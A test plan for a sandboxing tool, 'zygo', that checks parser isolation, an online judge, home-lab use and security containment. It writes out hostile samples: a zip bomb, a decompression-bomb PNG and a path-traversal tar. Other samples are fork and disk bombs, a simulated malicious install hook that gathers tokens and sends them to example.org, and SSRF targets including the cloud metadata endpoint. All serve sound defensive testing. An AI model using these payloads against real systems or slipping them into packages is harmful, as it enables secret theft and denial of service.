Benign samples: any small PDF, PNG and ZIP you have; put them in `in/`.

Hostile samples, generated locally (they are ordinary files until opened):

```bash
python3 - <<'PY'
import zipfile, io, tarfile, struct
# zip bomb: one 1 GB zero member; also nested five deep
z = zipfile.ZipFile("in/bomb.zip", "w", zipfile.ZIP_DEFLATED); z.writestr("z", b"\0" * (1 << 30)); z.close()
# decompression bomb PNG: 30000x30000 1-bit image, a few KB on disk
from PIL import Image; Image.new("1", (30000, 30000)).save("in/bomb.png", optimize=True)
# tar with a path traversal member
t = tarfile.open("in/evil.tar", "w"); i = tarfile.TarInfo("../../../../tmp/escaped"); i.size = 1; t.addfile(i, io.BytesIO(b"x")); t.close()
# a PDF that loops on itself (pypdf handles it, but slowly)
open("in/loop.pdf", "wb").write(b"%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 1 0 R >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF")
PY
```

### 4.2 One file, one sandbox

```bash
R="zygo run --mount $HOME/zygo-uc/uc4/in:/in:ro --mount $HOME/zygo-uc/uc4/parse.py:/app/parse.py:ro \
   --mount $HOME/zygo-uc/uc4/packages:/packages:ro --env PYTHONPATH=/packages \
   --mem 256M --scratch 64M --pids 8 --timeout 10s --seccomp strict \
   python:3.12-slim python3 /app/parse.py"
$R /in/sample.pdf; echo "exit $?"        # positive case first
$R /in/sample.png; echo "exit $?"
$R /in/sample.zip; echo "exit $?"
$R /in/bomb.zip;   echo "exit $?"        # ENOSPC at 64M scratch, or 137: not the host disk
$R /in/bomb.png;   echo "exit $?"        # Pillow's DecompressionBombError, or 137
$R /in/evil.tar;   echo "exit $?"        # filter="data" refuses; then run without the filter and confirm /tmp/escaped is not on the host
$R /in/loop.pdf;   echo "exit $?"
ls /tmp/escaped ~/zygo-uc/uc4/in/escaped 2>&1   # must not exist
```

Record each exit code and wall time; a hostile file that takes the full
10 s is a cost finding even though it is contained.

### 4.3 Throughput: cold `run` vs a warm function (inside the VM)

```bash
limactl shell zygo; cd ~/zygo-uc/uc4
zygo bench cold --n 200 --image python:3.12-slim                      # the floor: interpreter start + sandbox
time (for i in $(seq 200); do zygo run --mount $PWD/in:/in:ro --mem 128M --timeout 10s python:3.12-slim python3 -c 'open("/in/sample.pdf","rb").read()' >/dev/null; done)
```

Then the same work as a warm agent-mode function that takes the path:

```bash
cat > warm_parse.py <<'PY'
import subprocess, sys, json
def handler(event):
    p = subprocess.run([sys.executable, "/app/parse.py", event["path"]], capture_output=True, text=True, timeout=10)
    return json.loads(p.stdout or '{"error": "no output"}')
PY
zygo serve warm_parse.py --name parse --requirements requirements.txt \
  --mount $PWD/in:/in:ro --mount $PWD/parse.py:/app/parse.py:ro --env PYTHONPATH=/venv/lib/python3.12/site-packages \
  --mem 256M --scratch 64M --pids 8 --timeout 10s --concurrency 4
time (for i in $(seq 200); do zygo exec parse '{"path": "/in/sample.pdf"}' >/dev/null; done)
zygo bench warm --rate 250 --n 2000 -- sh -c cat      # the warm-exec floor, from the built-in benchmark
```

`serve` does have `--requirements`; the venv lands at `/venv`, and the
`PYTHONPATH` line is for the child interpreter `warm_parse.py` starts,
which is not the agent's own. Drop it if the child already sees the venv.

Record files/s for each of the three. Note that the warm agent still spawns
a Python per file (`subprocess`) so the interpreter cost is paid either way;
what changes is the sandbox cost. This is the number the "thousands per
second" claim has to be read against, and on a 2-vCPU VM it will not be
thousands — say what it is.

### 4.4 Leaks after 200 hostile runs

```bash
for i in $(seq 200); do $R /in/bomb.zip >/dev/null 2>&1; done
```

Then §0.4. Every failing run must leave nothing behind; the adoption round found
exactly this leak before, so the count must be zero, not small.

---

## 5. ARM, Raspberry Pi, home lab

Everything above ran on aarch64 already (the Lima VM); say so in the report
with `uname -m`. The claims specific to this market need the Pi from the
earlier rounds. If it is not reachable, record §5 as *blocked: no Pi* and
keep the Lima numbers.

### 5.1 The static binary

```bash
cd ~/workspace/mhmt/ahmed && make dist-linux
file poc/zygo-linux-musl                                # "statically linked", aarch64
ls -la poc/zygo-linux-musl                              # size in MB
scp poc/zygo-linux-musl pi:~/zygo
```

### 5.2 No root, no daemon, an ordinary user

On the Pi, as the ordinary user, with no `sudo`:

```bash
./zygo doctor                                           # all ok except landlock on 6.5, as before
ps -eo comm | grep -c zygo                              # 0: nothing is running
./zygo run alpine:3 uname -m
./zygo serve ~/zygo-uc/uc2/transform.py --name t --mode stdin
ps -eo pid,rss,comm | grep zygo                         # exactly the supervisor and one zygote; note the RSS
./zygo exec t '{"rows": [{"amount": 1}]}'
./zygo stop --all; ps -eo comm | grep -c zygo           # 0 again
```

Record: total RSS of the supervisor plus one warm Python function, in MB.
That is the number a home-lab user compares with `dockerd`.

### 5.3 A cron job, the design document's recipe

```bash
(crontab -l; echo '*/5 * * * * $HOME/zygo exec t "{\"rows\": []}" >> $HOME/zygo-cron.log 2>&1') | crontab -
```

Wait ten minutes; two lines in the log. Then reboot the Pi: the supervisor is
a user process, not a unit, so the first cron call after the boot must
either cold-start it or fail loudly — record which, because a home-lab user
will hit exactly this. (`zygo install-service` is the decided answer, A1,
and is not built; say so.)

### 5.4 The webhook example on the Pi over the LAN

```bash
cd ~/workspace/mhmt/ahmed/examples/webhook      # copy the directory to the Pi first
export WEBHOOK_SECRET=change-me; ../../zygo up
export ZYGO_API_TOKEN=$(openssl rand -hex 16); ../../zygo api --listen 0.0.0.0:7700 &
```

From the Mac: `curl -H "Authorization: Bearer …" -d '{"payload": {"kind":
"order", "items": [1,2,3]}}' http://<pi>:7700/fn/webhook`. Then confirm the
API refuses `--no-auth` on `0.0.0.0` with a message. Record the round-trip
time from the Mac and the p50 from `ab -n 500 -c 4` on the Pi itself.

---

## 6. Online judge and education

The claims: a submission runs in its own sealed sandbox with a CPU, memory,
process and time budget, and a hostile submission ends with the sandbox.

### 6.1 A judge driver in forty lines

`~/zygo-uc/uc6/judge.py`:

```python
"""judge.py <dir>: dir holds main.{c,py,js}, in.txt, expected.txt. Prints a verdict."""
import subprocess, sys, time
from pathlib import Path
d = Path(sys.argv[1]).resolve()
src = next(p for p in d.iterdir() if p.stem == "main")
image, build, run = {
    ".c":  ("gcc:13",           "gcc -O2 -o /tmp/a /src/main.c", "/tmp/a"),
    ".py": ("python:3.12-slim", "true",                          "python3 /src/main.py"),
    ".js": ("node:22-alpine",   "true",                          "node /src/main.js"),
}[src.suffix]
cmd = ["zygo", "run", "--mount", f"{d}:/src:ro", "--net", "none", "--mem", "256M", "--cpu", "1",
       "--pids", "16", "--scratch", "32M", "--timeout", "3s", image,
       "sh", "-c", f"{build} && {run} < /src/in.txt"]
t = time.time()
p = subprocess.run(cmd, capture_output=True, text=True)
ms = int((time.time() - t) * 1000)
if p.returncode == 137:   verdict = "TLE/MLE (exit 137)"
elif p.returncode != 0:   verdict = f"RE (exit {p.returncode})"
elif p.stdout.strip() == (d / "expected.txt").read_text().strip(): verdict = "AC"
else:                     verdict = "WA"
print(f"{d.name:20} {verdict:22} {ms:6} ms  stderr: {p.stderr.strip()[:80]}")
```

Submissions, one directory each under `~/zygo-uc/uc6/subs/`:

| dir | main | in.txt | expected | verdict wanted |
|---|---|---|---|---|
| `ac-c` | reads two ints, prints the sum | `2 3` | `5` | AC |
| `ac-py` | same, Python | `2 3` | `5` | AC |
| `ac-js` | same, Node | `2 3` | `5` | AC |
| `wa-py` | prints the product | `2 3` | `5` | WA |
| `tle-py` | `while True: pass` | | | TLE (3 s) |
| `mle-py` | `x = bytearray(1 << 30)` | | | MLE |
| `re-py` | `1/0` | | | RE |
| `fork-py` | `while True: os.fork()` | | | RE or 137, not a hung judge |
| `disk-py` | writes 1 GB to `/tmp` | | | RE (ENOSPC at 32M) |
| `net-py` | `urllib.request.urlopen("https://example.com")` | | | RE |
| `spy-py` | prints `open("/etc/shadow").read()` and `os.listdir("/src/..")` | | | RE; and nothing from the host in stdout |
| `ce-c` | a syntax error | | | RE at the build step |

```bash
cd ~/zygo-uc/uc6 && for s in subs/*/; do python3 judge.py "$s"; done
```

Expected: the verdict column as in the table; every row under 4 s; the
`spy-py` row's stderr contains no host path or host file content. The
finding to look for: **TLE and MLE are both exit 137 at the CLI.** A judge
needs to tell them apart. Note whether `zygo run --json` (if it exists) or the
API's `POST /run` answer (`timed_out` vs `exit_code: 137`, §1.7) closes that,
and say which one the driver should use.

### 6.2 A class submits at once

```bash
limactl shell zygo; cd ~/zygo-uc/uc6
ls -d subs/*/ | xargs -P 8 -n 1 python3 judge.py     # 12 submissions, 8 at a time
time (for i in $(seq 10); do ls -d subs/ac-*/ ; done | xargs -P 8 -n 1 python3 judge.py > /dev/null)   # 30 AC runs
```

Record submissions/s at `-P 8` on the 2-vCPU VM, and whether any verdict
changed under contention (a TLE that became AC, or an AC that became TLE,
is a scheduling finding). Then §0.4.

### 6.3 A student shell

```bash
zygo run --tty --mem 128M --pids 32 --timeout 10m --mount ~/zygo-uc/uc6/subs/ac-py:/home/student:rw python:3.12-slim /bin/bash
```

Inside: `id`, `ls /`, `cat /proc/1/cgroup`, `python3 main.py < in.txt`,
`ping 1.1.1.1`, `ls /proc | wc -l`, `mount`, `cat /etc/shadow`. Expected:
uid 1000, no network, only its own processes, `/etc/shadow` unreadable or
the image's own, and the home mount writable while the rest is not. Exit
with `exit`; then confirm from the Mac that the file the student wrote is in
`subs/ac-py/` and nowhere else.

### 6.4 Judge0 itself (optional)

Judge0 is a Rails app with its own worker that shells out to `isolate`.
Replacing `isolate` with `zygo run` is a change in Judge0's repository, not
here; the scenario is 6.1, which is the same contract (compile, run with
stdin, compare, budget). Do not install Judge0 for this pass; record
*not run*.

---

## 7. Security isolation

Not a seventh market so much as a lens on the first four: the claims that
matter to a security engineer are that hostile code cannot reach the network
it was not given, cannot read a secret it was not handed, and cannot touch
the host filesystem outside a read-only mount — and that these are enforced
by the kernel, not by the program being careful. Every scenario here runs on
today's `ns` binary. Two honest caveats frame the whole block:

* **`ns` is one kernel.** A kernel privilege-escalation bug defeats every
  control below at once; that is the residual risk the threat model names,
  and the reason `isolation = "vm"` exists for code you cannot read. `vm` is
  not built and the VM has no KVM, so nothing here is a claim about a
  hardware boundary.
* **Zygo is an isolation primitive, not an analysis sandbox.** It contains
  hostile code; it does not report on it. There is no syscall trace, no
  network-request log, no structured "why it died". A denied syscall kills
  the process — `zygo run` answers exit 137 and nothing more. §7.5 lists the
  three small features that would move it toward a security tool and marks
  them *proposed, not testable*, so this pass measures containment, not
  observability.

### 7.1 Supply-chain isolation: an install script that cannot exfiltrate

The threat: a malicious `postinstall` or a poisoned `setup.py` that reads the
environment and phones home. The control: egress limited to the registry, and
the secret delivered as a per-request file the build never sees.

`~/zygo-uc/uc7/evil_setup.py` — stands in for a hostile package's install hook:

```python
import os, sys, socket, urllib.request

report = {"cwd": os.getcwd()}
# 1. read every secret-shaped thing it can find
report["env"] = {k: v for k, v in os.environ.items() if any(s in k.upper() for s in ("KEY", "TOKEN", "SECRET", "AWS", "NPM"))}
try:
    report["secret_file"] = open("/run/secrets/NPM_TOKEN").read()
except Exception as e:
    report["secret_file"] = f"{type(e).__name__}"
# 2. try to exfiltrate to an attacker host that is not the registry
try:
    urllib.request.urlopen("https://example.org/collect?d=" + str(report), timeout=4)
    report["exfil"] = "SENT"
except Exception as e:
    report["exfil"] = f"blocked: {type(e).__name__}"
# 3. try the cloud metadata endpoint
try:
    urllib.request.urlopen("http://169.254.169.254/latest/meta-data/", timeout=4)
    report["metadata"] = "REACHED"
except Exception as e:
    report["metadata"] = f"blocked: {type(e).__name__}"
print(report, file=sys.stderr)
```

Run it the way a package installer would — with the registry allowed, a
secret in the environment, and nothing else — inside the VM so the secret and
the env cross into the sandbox at all (todo B-28):

```bash
limactl shell zygo
mkdir -p ~/zygo-uc/uc7 && cd ~/zygo-uc/uc7   # paste evil_setup.py here
export NPM_TOKEN=npm_realsecret_do_not_leak
export AWS_SECRET_ACCESS_KEY=aws_realsecret_too

cat > sandbox.toml <<'T'
[fn.install]
image   = "python:3.12-slim"
entry   = "install.py"
network = "egress"
allow   = ["registry.npmjs.org:443", "pypi.org:443", "files.pythonhosted.org:443"]
secrets = ["NPM_TOKEN"]
timeout = "30s"
T
cat > install.py <<'PY'
import runpy
def handler(event):
    runpy.run_path("/app/evil_setup.py", run_name="__main__")
    return {"ran": True}
PY
# mount the hostile script read-only, as an installer would fetch it
zygo serve install.py --name install --secret NPM_TOKEN \
  --net egress --allow registry.npmjs.org:443 --allow pypi.org:443 --allow files.pythonhosted.org:443 \
  --mount $PWD/evil_setup.py:/app/evil_setup.py:ro
zygo exec install '{}'
zygo logs install --failed -n 5     # the report is on stderr
```

Expected in the report the script printed:

| Field | Must be | Meaning |
|---|---|---|
| `env` | `{}` | `NPM_TOKEN`/`AWS_*` never entered the sandbox env |
| `secret_file` | the token *is* there under `/run/secrets/NPM_TOKEN` | the build gets what it needs, as a file, only for this request |
| `exfil` | `blocked: URLError` | example.org is not on the allowlist — a *name resolution* failure, not a timeout |
| `metadata` | `blocked: …` | link-local refused even if it were listed |

The finding to look for: `secret_file` holding the token while `env` is empty
is the whole point — the secret is available to the build step but not to
anything the build spawns or logs, and it is gone the moment the request
ends (`zygo shell install -- ls /run/secrets` between requests: empty). If
`exfil` is `SENT`, that is a critical defect; write it up first.

Then the positive control, so the negative means something: add
`example.org:443` to `--allow`, `zygo serve` again, re-run, and confirm
`exfil` becomes `SENT`. A refusal that survives adding the host to the list
would be a bug in the opposite direction (something other than the allowlist
is blocking it), and the report should say which.

### 7.2 SSRF-safe fetch: a URL the user controls

The threat: a "fetch this URL" feature — link preview, webhook validator,
avatar loader — pointed at the internal network or the metadata service. The
control: under `egress`, private and link-local ranges are refused even when
listed, DNS goes through Zygo's own resolver, and a name off the list does
not resolve (so DNS-rebinding a public name to `169.254.169.254` fails at the
resolver, not at connect time).

Reuse `fetch.py` from §1.4. `~/zygo-uc/uc7` `sandbox.toml` adds:

```toml
[fn.preview]
image   = "python:3.12-slim"
entry   = "fetch.py"
network = "egress"
allow   = ["example.com:443"]
timeout = "8s"
```

```bash
zygo up
# positive control first
zygo exec preview '{"url": "https://example.com/"}'                     # 200
# SSRF targets, all must fail:
zygo exec preview '{"url": "http://127.0.0.1:7700/"}'                   # loopback
zygo exec preview '{"url": "http://10.0.0.1/"}'                         # RFC1918
zygo exec preview '{"url": "http://172.16.0.1/"}'                       # RFC1918
zygo exec preview '{"url": "http://192.168.1.1/"}'                      # RFC1918
zygo exec preview '{"url": "http://169.254.169.254/latest/meta-data/"}' # cloud metadata
zygo exec preview '{"url": "http://[::1]/"}'                            # IPv6 loopback
zygo exec preview '{"url": "http://metadata.google.internal/"}'        # name off the list
```

Expected: the first succeeds, every other line fails. Record which failure
each gives — a resolver refusal for the names, a connect refusal for the
literals — and the time each takes; a fast refusal is a usability property a
fetch feature needs.

Two sharper checks:

```bash
# private range even when explicitly allowed: must still refuse without --allow-private-net
zygo serve fetch.py --name preview2 --net egress --allow 169.254.169.254:80 --allow 10.0.0.0/8:80
zygo exec preview2 '{"url": "http://169.254.169.254/latest/meta-data/"}'   # still refused
zygo stop preview2
# and confirm the escape hatch is a deliberate flag, not a default
zygo serve fetch.py --name preview3 --net egress --allow 10.0.0.0/8:80 --allow-private-net
```

Expected: `preview2` is refused at resolve or ruleset time and the message
names `--allow-private-net`; `preview3` accepts the rule. That the metadata
address needs an explicit opt-in even when named is the property that makes
this SSRF-safe by default — record whether the opt-in is a per-run flag only
(it is; there is no way to make it the default without typing it), which is
the right shape for this.

### 7.3 A security scanner in a box

The threat is inverted here: the *tool* is trusted, the *target* is not, and
a scanner that parses a hostile repo is itself an attack surface. Run one
over untrusted input with the repo read-only and no network.

```bash
cd ~/zygo-uc/uc7
git clone --depth 1 https://github.com/some/untrusted-repo repo   # any repo stands in
zygo run --mount $PWD/repo:/src:ro --net none --mem 1G --pids 256 --timeout 5m \
  aquasec/trivy:latest fs --scanners vuln,secret /src ; echo "exit $?"
```

Expected: Trivy runs, the repo is read-only (a scanner that tries to write a
lockfile fails), and no scanner process opens a socket. Then the containment
check: point a scanner that *wants* the network (`trivy` DB update) at
`--net none` and confirm it fails closed rather than silently skipping —
`--net egress --allow ghcr.io:443` is the deliberate widening, and the report
should show both the refusal and the allowed run. This is the CI-job example
(§ examples/ci-job) with a security tool as the payload; if `trivy`'s image is
awkward to pull on aarch64, substitute `semgrep/semgrep` or a local `grep`
over `/src` — the scenario is the boundary, not the tool.

### 7.4 The escape suite is the real evidence

This document does not re-derive the boundary; the project already attempts
it directly. For a security reader, the scenarios above are illustrations and
these are the proof — run them and quote the totals:

```bash
cd ~/workspace/mhmt/ahmed
make escape-linux            # 16 escape attempts against a real kernel
make fuzz-linux              # every syscall number against all three seccomp profiles
make verify-linux            # 30 isolation and limit checks
make seccomp-matrix-linux    # five real packages under default and strict
```

Expected: escapes 16 blocked / 0 escaped, fuzz 0 failed, verify 0 failed.
Any single escape here outranks every green row above. Record the exact
counts, because todo X-01 notes the numbers quoted in different files
disagree — this is the chance to write down what the suites actually print.

### 7.5 What would make it a security tool (proposed, not testable)

Record these as gaps, not results. Each is small and fits the current
architecture; none exists today, so there is nothing to run:

* **`seccomp = "audit"`** — a profile that logs a denied syscall
  (`SECCOMP_RET_LOG`) instead of killing the process, so an analyst learns
  *what* the code tried, not just that it died. The three profiles today are
  `default`, `strict`, `permissive`; none audits.
* **Per-request network decision log** — which name was asked for, which was
  admitted, which was refused. The resolver and the nftables set make these
  decisions; nothing surfaces them. Today the only signal is that a request
  failed.
* **Structured result on `zygo run`** — `--json` prints the *plan* before a
  run, not the outcome after it. A security caller needs the outcome
  distinguished: timeout vs OOM vs a denied syscall vs a non-zero exit, the
  way the API's `POST /run` answer separates `timed_out` from `exit_code:
  137`. The CLI collapses all of them to 137.

A follow-up pass that added these three could report on hostile code, not
only contain it. This pass measures containment.

---

## Order of execution and time budget

| Block | Scenarios | Est. time | Needs |
|---|---|---|---|
| 0 | setup | 20 min | network for pulls |
| 2 | 2.1–2.8 | 1.5 h | — |
| 1 | 1.1–1.6, 1.9 | 1.5 h | — |
| 4 | 4.1–4.4 | 1 h | pip network once |
| 7 | 7.1–7.4 | 1 h | escape suite, a repo to scan |
| 3 | 3.1–3.3, 3.5, 3.6 | 1.5 h | `ab` |
| 6 | 6.1–6.3 | 1 h | `gcc:13` pulled |
| working tree | 1.7, 1.8, 3.4 | 45 min | a successful build of the tree |
| embedders | 2.9, 2.10 | 1.5 h | n8n, Temporal |
| 5 | 5.1–5.4 | 1 h | the Pi |

Block 2 first because it is the strongest claim and the adoption rounds already
proved the harness; a failure there is a regression and changes what the rest
means. Block 7 sits next to blocks 1 and 4 because it reuses their sandboxes
and its §7.4 is the escape suite, which is the load-bearing evidence for
every security claim. Block 5 last because it needs another machine.

## What the report must say at the top

Three lines before the table: which binary (commit or "working tree at
HH:MM"), the `zygo doctor` VM block, and whether the Pi was reachable. Then
the table, then one paragraph per use case with the verdict a reader in that
market would want: *does this do the job today, and what is the one thing it
does not do.*
